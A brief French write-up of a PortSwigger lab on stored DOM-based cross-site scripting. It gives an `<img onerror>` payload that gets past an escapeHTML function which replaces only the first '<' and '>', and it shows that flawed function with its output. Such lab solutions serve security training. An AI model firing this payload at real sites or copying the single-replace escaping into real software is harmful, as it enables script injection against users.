# Lab

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored

## Payload

Dans le body du commentaire : `<><img src=1 onerror=alert(1)>`

La fonction JS escapeHTML ne remplace que les premières occurences de `<` et `>` par `&lt;` et `&gt;` respectivement. 

```js
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```

Par exemple :

```js
escapeHTML('<><img src=1 onerror=alert(1)>')
// => "&lt;&gt;<img src=1 onerror=alert(1)>"
```